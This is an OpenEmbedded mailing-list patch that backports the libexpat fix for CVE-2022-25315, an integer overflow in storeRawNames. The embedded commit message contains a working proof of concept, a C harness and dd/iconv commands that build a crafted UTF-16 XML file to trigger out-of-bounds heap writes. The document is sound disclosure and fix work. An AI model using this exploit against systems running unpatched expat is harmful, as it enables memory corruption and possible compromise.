Return-Path: <kai.kang@windriver.com>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from aws-us-west-2-korg-lkml-1.web.codeaurora.org (localhost.localdomain [127.0.0.1])
	by smtp.lore.kernel.org (Postfix) with ESMTP id 5F260C433F5
	for <webhook@archiver.kernel.org>; Thu, 31 Mar 2022 05:51:55 +0000 (UTC)
Received: from mail1.wrs.com (mail1.wrs.com [147.11.3.146])
 by mx.groups.io with SMTP id smtpd.web11.3759.1648705911761586087
 for <openembedded-core@lists.openembedded.org>;
 Wed, 30 Mar 2022 22:51:51 -0700
Authentication-Results: mx.groups.io;
 dkim=missing;
 spf=permerror,
 err=parse error for token &{10 18 %{ir}.%{v}.%{d}.spf.has.pphosted.com}: invalid
 domain name (domain: windriver.com, ip: 147.11.3.146,
 mailfrom: kai.kang@windriver.com)
Received: from ala-exchng01.corp.ad.wrs.com (ala-exchng01.corp.ad.wrs.com
 [147.11.82.252])
	by mail1.wrs.com (8.15.2/8.15.2) with ESMTPS id 22V5pnY7018527
	(version=TLSv1.2 cipher=AES256-GCM-SHA384 bits=256 verify=FAIL)
	for <openembedded-core@lists.openembedded.org>;
 Wed, 30 Mar 2022 22:51:49 -0700
Received: from ala-exchng01.corp.ad.wrs.com (147.11.82.252) by
 ala-exchng01.corp.ad.wrs.com (147.11.82.252) with Microsoft SMTP Server
 (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256) id
 15.1.2242.12; Wed, 30 Mar 2022 22:51:48 -0700
Received: from pek-lpg-core3.wrs.com (128.224.153.232) by
 ala-exchng01.corp.ad.wrs.com (147.11.82.252) with Microsoft SMTP Server id
 15.1.2242.12 via Frontend Transport; Wed, 30 Mar 2022 22:51:47 -0700
From: <kai.kang@windriver.com>
To: <openembedded-core@lists.openembedded.org>
Subject: [hardknott][PATCH 3/3] expat: fix CVE-2022-25315
Date: Thu, 31 Mar 2022 13:51:39 +0800
Message-ID: <20220331055139.1975-3-kai.kang@windriver.com>
X-Mailer: git-send-email 2.17.1
In-Reply-To: <20220331055139.1975-1-kai.kang@windriver.com>
References: <20220331055139.1975-1-kai.kang@windriver.com>
MIME-Version: 1.0
Content-Type: text/plain
List-Id: <openembedded-core.lists.openembedded.org>
X-Webhook-Received: from li982-79.members.linode.com [45.33.32.79] by
 aws-us-west-2-korg-lkml-1.web.codeaurora.org with HTTPS for
 <openembedded-core@lists.openembedded.org>; Thu, 31 Mar 2022 05:51:55 -0000
X-Groupsio-URL: 
 https://lists.openembedded.org/g/openembedded-core/message/163803

From: Kai Kang <kai.kang@windriver.com>

Backport patch to fix CVE-2022-25315.

CVE: CVE-2022-25315

Signed-off-by: Kai Kang <kai.kang@windriver.com>
---
 .../expat/expat/CVE-2022-25315.patch          | 149 ++++++++++++++++++
 meta/recipes-core/expat/expat_2.2.10.bb       |   1 +
 2 files changed, 150 insertions(+)
 create mode 100644 meta/recipes-core/expat/expat/CVE-2022-25315.patch

diff --git a/meta/recipes-core/expat/expat/CVE-2022-25315.patch b/meta/recipes-core/expat/expat/CVE-2022-25315.patch
new file mode 100644
index 0000000000..24e04dac71
--- /dev/null
+++ b/meta/recipes-core/expat/expat/CVE-2022-25315.patch
@@ -0,0 +1,149 @@
+CVE: CVE-2022-25315
+Upstream-Status: Backport [https://github.com/libexpat/libexpat/commit/eb036280]
+
+Ref:
+* https://github.com/libexpat/libexpat/pull/559
+
+Signed-off-by: Kai Kang <kai.kang@windriver.com>
+
+From eb0362808b4f9f1e2345a0cf203b8cc196d776d9 Mon Sep 17 00:00:00 2001
+From: Samanta Navarro <ferivoz@riseup.net>
+Date: Tue, 15 Feb 2022 11:55:46 +0000
+Subject: [PATCH] Prevent integer overflow in storeRawNames
+
+It is possible to use an integer overflow in storeRawNames for out of
+boundary heap writes. Default configuration is affected. If compiled
+with XML_UNICODE then the attack does not work. Compiling with
+-fsanitize=address confirms the following proof of concept.
+
+The problem can be exploited by abusing the m_buffer expansion logic.
+Even though the initial size of m_buffer is a power of two, eventually
+it can end up a little bit lower, thus allowing allocations very close
+to INT_MAX (since INT_MAX/2 can be surpassed). This means that tag
+names can be parsed which are almost INT_MAX in size.
+
+Unfortunately (from an attacker point of view) INT_MAX/2 is also a
+limitation in string pools. Having a tag name of INT_MAX/2 characters
+or more is not possible.
+
+Expat can convert between different encodings. UTF-16 documents which
+contain only ASCII representable characters are twice as large as their
+ASCII encoded counter-parts.
+
+The proof of concept works by taking these three considerations into
+account:
+
+1. Move the m_buffer size slightly below a power of two by having a
+   short root node <a>. This allows the m_buffer to grow very close
+   to INT_MAX.
+2. The string pooling forbids tag names longer than or equal to
+   INT_MAX/2, so keep the attack tag name smaller than that.
+3. To be able to still overflow INT_MAX even though the name is
+   limited at INT_MAX/2-1 (nul byte) we use UTF-16 encoding and a tag
+   which only contains ASCII characters. UTF-16 always stores two
+   bytes per character while the tag name is converted to using only
+   one. Our attack node byte count must be a bit higher than
+   2/3 INT_MAX so the converted tag name is around INT_MAX/3 which
+   in sum can overflow INT_MAX.
+
+Thanks to our small root node, m_buffer can handle 2/3 INT_MAX bytes
+without running into INT_MAX boundary check. The string pooling is
+able to store INT_MAX/3 as tag name because the amount is below
+INT_MAX/2 limitation. And creating the sum of both eventually overflows
+in storeRawNames.
+
+Proof of Concept:
+
+1. Compile expat with -fsanitize=address.
+
+2. Create Proof of Concept binary which iterates through input
+   file 16 MB at once for better performance and easier integer
+   calculations:
+
+```
+cat > poc.c << EOF
+ #include <err.h>
+ #include <expat.h>
+ #include <stdlib.h>
+ #include <stdio.h>
+
+ #define CHUNK (16 * 1024 * 1024)
+ int main(int argc, char *argv[]) {
+   XML_Parser parser;
+   FILE *fp;
+   char *buf;
+   int i;
+
+   if (argc != 2)
+     errx(1, "usage: poc file.xml");
+   if ((parser = XML_ParserCreate(NULL)) == NULL)
+     errx(1, "failed to create expat parser");
+   if ((fp = fopen(argv[1], "r")) == NULL) {
+     XML_ParserFree(parser);
+     err(1, "failed to open file");
+   }
+   if ((buf = malloc(CHUNK)) == NULL) {
+     fclose(fp);
+     XML_ParserFree(parser);
+     err(1, "failed to allocate buffer");
+   }
+   i = 0;
+   while (fread(buf, CHUNK, 1, fp) == 1) {
+     printf("iteration %d: XML_Parse returns %d\n", ++i,
+       XML_Parse(parser, buf, CHUNK, XML_FALSE));
+   }
+   free(buf);
+   fclose(fp);
+   XML_ParserFree(parser);
+   return 0;
+ }
+EOF
+gcc -fsanitize=address -lexpat -o poc poc.c
+```
+
+3. Construct specially prepared UTF-16 XML file:
+
+```
+dd if=/dev/zero bs=1024 count=794624 | tr '\0' 'a' > poc-utf8.xml
+echo -n '<a><' | dd conv=notrunc of=poc-utf8.xml
+echo -n '><' | dd conv=notrunc of=poc-utf8.xml bs=1 seek=805306368
+iconv -f UTF-8 -t UTF-16LE poc-utf8.xml > poc-utf16.xml
+```
+
+4. Run proof of concept:
+
+```
+./poc poc-utf16.xml
+```
+---
+ expat/lib/xmlparse.c | 7 ++++++-
+ 1 file changed, 6 insertions(+), 1 deletion(-)
+
+diff --git a/expat/lib/xmlparse.c b/expat/lib/xmlparse.c
+index 4b43e613..f34d6ab5 100644
+--- a/lib/xmlparse.c
++++ b/lib/xmlparse.c
+@@ -2563,6 +2563,7 @@ storeRawNames(XML_Parser parser) {
+   while (tag) {
+     int bufSize;
+     int nameLen = sizeof(XML_Char) * (tag->name.strLen + 1);
++    size_t rawNameLen;
+     char *rawNameBuf = tag->buf + nameLen;
+     /* Stop if already stored.  Since m_tagStack is a stack, we can stop
+        at the first entry that has already been copied; everything
+@@ -2574,7 +2575,11 @@ storeRawNames(XML_Parser parser) {
+     /* For re-use purposes we need to ensure that the
+        size of tag->buf is a multiple of sizeof(XML_Char).
+     */
+-    bufSize = nameLen + ROUND_UP(tag->rawNameLength, sizeof(XML_Char));
++    rawNameLen = ROUND_UP(tag->rawNameLength, sizeof(XML_Char));
++    /* Detect and prevent integer overflow. */
++    if (rawNameLen > (size_t)INT_MAX - nameLen)
++      return XML_FALSE;
++    bufSize = nameLen + (int)rawNameLen;
+     if (bufSize > tag->bufEnd - tag->buf) {
+       char *temp = (char *)REALLOC(parser, tag->buf, bufSize);
+       if (temp == NULL)
+-- 
+2.33.0
+
diff --git a/meta/recipes-core/expat/expat_2.2.10.bb b/meta/recipes-core/expat/expat_2.2.10.bb
index 0ab93bd93d..c8919c7f2f 100644
--- a/meta/recipes-core/expat/expat_2.2.10.bb
+++ b/meta/recipes-core/expat/expat_2.2.10.bb
@@ -22,6 +22,7 @@ SRC_URI = "https://github.com/libexpat/libexpat/releases/download/R_${VERSION_TA
            file://CVE-2022-25236-2.patch \
            file://CVE-2022-25313.patch \
            file://CVE-2022-25314.patch \
+           file://CVE-2022-25315.patch \
            "
 
 UPSTREAM_CHECK_URI = "https://github.com/libexpat/libexpat/releases/"
-- 
2.17.1


